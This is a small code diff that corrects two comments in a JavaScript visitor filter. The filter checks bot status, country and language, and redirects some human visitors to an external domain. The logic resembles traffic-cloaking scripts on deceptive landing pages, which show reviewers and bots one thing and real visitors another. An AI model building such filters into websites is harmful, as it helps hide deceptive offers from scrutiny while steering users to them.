@@ -43,10 +43,10 @@ if (allowed_languages.includes(language)) {
   language_allowed = true;
 }
 
-// If all filters passes, redirect user to error page
+// If all filters fail, redirect user to error page
 if (!is_bot && !country_allowed && !language_allowed) {
   window.location.href = 'https://l106-co.idealica-lat.com/';
 }
 
-// If any filter fail, continue with normal page content
+// If any filter passes, continue with normal page content
 console.log("Welcome to our website!");
